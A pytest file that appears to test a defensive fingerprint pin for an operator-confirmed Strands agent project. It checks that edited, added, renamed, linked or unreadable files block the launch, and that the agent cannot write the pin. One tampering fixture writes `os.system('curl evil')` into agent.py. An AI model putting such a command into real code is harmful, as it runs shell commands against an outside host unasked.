"""The operator's Strands project runs only as the version the operator confirmed.

``agent.strands_project`` is imported inside the Strands worker that holds the provider
keys, and its module code runs outside the tool gate. So a launch recomputes the
project folder's fingerprint and refuses unless it equals ``agent.strands_project_sha256``,
which only the operator records and the agent cannot write.
"""

from __future__ import annotations

import os
from pathlib import Path
from types import SimpleNamespace

import pytest

from kiro_crew import platform_compat
from kiro_crew.acp.harness import strands as strands_mod
from kiro_crew.acp.harness import strands_project_pin as pin_mod


def _project(root: Path) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    (root / "agent.py").write_text("from helpers import build\nagent = build()\n", encoding="utf-8")
    (root / "helpers.py").write_text("def build():\n    return None\n", encoding="utf-8")
    (root / "prompts").mkdir()
    (root / "prompts" / "system.txt").write_text("be brief\n", encoding="utf-8")
    return root / "agent.py"


def _config(monkeypatch: pytest.MonkeyPatch, project: str, pin: str) -> None:
    from kiro_crew.config import loader

    agent = SimpleNamespace(strands_project=project, strands_project_sha256=pin)
    monkeypatch.setattr(
        loader.KiroCrewConfig, "load", classmethod(lambda cls: SimpleNamespace(agent=agent))
    )


def _pinned(entry: Path) -> str:
    return pin_mod.project_fingerprint(entry)[0]


def test_an_unchanged_confirmed_project_launches(tmp_path, monkeypatch) -> None:
    entry = _project(tmp_path / "proj")
    _config(monkeypatch, str(entry.parent), _pinned(entry).upper())
    assert strands_mod._strands_user_project() == (str(entry.resolve()), _pinned(entry))


def test_an_edited_agent_py_is_refused(tmp_path, monkeypatch) -> None:
    entry = _project(tmp_path / "proj")
    pin = _pinned(entry)
    entry.write_text("import os\nos.system('curl evil')\nagent = None\n", encoding="utf-8")
    _config(monkeypatch, str(entry), pin)
    with pytest.raises(ValueError, match="changed since you confirmed it") as caught:
        strands_mod._strands_user_project()
    # The refusal names the command, with the current value, and records nothing.
    assert f"kirocrew config set agent.strands_project_sha256 {_pinned(entry)}" in str(caught.value)


def test_an_added_file_is_refused(tmp_path, monkeypatch) -> None:
    entry = _project(tmp_path / "proj")
    pin = _pinned(entry)
    (entry.parent / "prompts" / "sitecustomize.py").write_text("x = 1\n", encoding="utf-8")
    _config(monkeypatch, str(entry.parent), pin)
    with pytest.raises(ValueError, match="changed since you confirmed it"):
        strands_mod._strands_user_project()


def test_a_renamed_file_is_refused(tmp_path) -> None:
    entry = _project(tmp_path / "proj")
    pin = _pinned(entry)
    os.rename(entry.parent / "helpers.py", entry.parent / "helpers2.py")
    assert pin_mod.project_pin_issue(str(entry), pin)


def test_a_project_never_confirmed_is_refused(tmp_path, monkeypatch) -> None:
    entry = _project(tmp_path / "proj")
    _config(monkeypatch, str(entry.parent), "")
    with pytest.raises(ValueError, match="was never confirmed"):
        strands_mod._strands_user_project()


def test_the_bundled_project_needs_no_pin(monkeypatch) -> None:
    _config(monkeypatch, "", "")
    assert strands_mod._strands_user_project() == ("", "")


def test_bytecode_caches_are_not_part_of_the_fingerprint(tmp_path) -> None:
    entry = _project(tmp_path / "proj")
    pin = _pinned(entry)
    (entry.parent / "__pycache__").mkdir()
    (entry.parent / "__pycache__" / "helpers.cpython-312.pyc").write_bytes(b"\0" * 16)
    assert pin_mod.project_pin_issue(str(entry), pin) == ""


@pytest.mark.skipif(not platform_compat.IS_POSIX, reason="symlink creation needs privileges")
def test_a_link_inside_the_project_is_refused_not_followed(tmp_path) -> None:
    entry = _project(tmp_path / "proj")
    outside = tmp_path / "outside.py"
    outside.write_text("x = 1\n", encoding="utf-8")
    (entry.parent / "linked.py").symlink_to(outside)
    with pytest.raises(pin_mod.ProjectPinError, match="is a link"):
        pin_mod.project_fingerprint(entry)
    assert "cannot fingerprint" in pin_mod.project_pin_issue(str(entry), "")


@pytest.mark.skipif(
    not platform_compat.IS_POSIX or os.geteuid() == 0, reason="needs POSIX modes, not root"
)
def test_an_unreadable_file_is_refused(tmp_path) -> None:
    entry = _project(tmp_path / "proj")
    secret = entry.parent / "helpers.py"
    secret.chmod(0)
    try:
        with pytest.raises(pin_mod.ProjectPinError, match="cannot read helpers.py"):
            pin_mod.project_fingerprint(entry)
    finally:
        secret.chmod(0o600)


def test_a_folder_past_the_file_bound_is_refused(tmp_path, monkeypatch) -> None:
    entry = _project(tmp_path / "proj")
    monkeypatch.setattr(pin_mod, "MAX_FILES", 2)
    with pytest.raises(pin_mod.ProjectPinError, match="more than 2 files"):
        pin_mod.project_fingerprint(entry)


def test_the_agent_cannot_write_the_pin() -> None:
    """The pin lives in config.json: sealed to the agent's file tools and sandbox shells,
    and not a dashboard- or card-editable setting, so no agent tool can record it."""
    from kiro_crew import sandbox_leaves
    from kiro_crew.config.paths import config_dir
    from kiro_crew.dashboard.handlers.core_config_schema import _EDITABLE_CONFIG
    from kiro_crew.security import is_sensitive_write_path

    assert "config.json" in sandbox_leaves._CREW_READONLY_LEAVES
    assert "config.local.json" in sandbox_leaves._CREW_READONLY_LEAVES
    assert is_sensitive_write_path(os.path.join(config_dir(), "config.json"))
    assert is_sensitive_write_path(os.path.join(config_dir(), "config.local.json"))
    assert pin_mod.PIN_SETTING not in _EDITABLE_CONFIG
    assert "strands_project_sha256" not in str(sorted(_EDITABLE_CONFIG))


def test_the_launch_passes_the_pin_to_the_gate(monkeypatch) -> None:
    launch = strands_mod.StrandsLaunch()
    launch._project, launch._project_pin = "/p/agent.py", "ab" * 32
    env: dict[str, str] = {}
    launch.apply_spawn_env(env)
    assert env["KIROCREW_STRANDS_PROJECT"] == "/p/agent.py"
    assert env["KIROCREW_STRANDS_PROJECT_SHA256"] == "ab" * 32
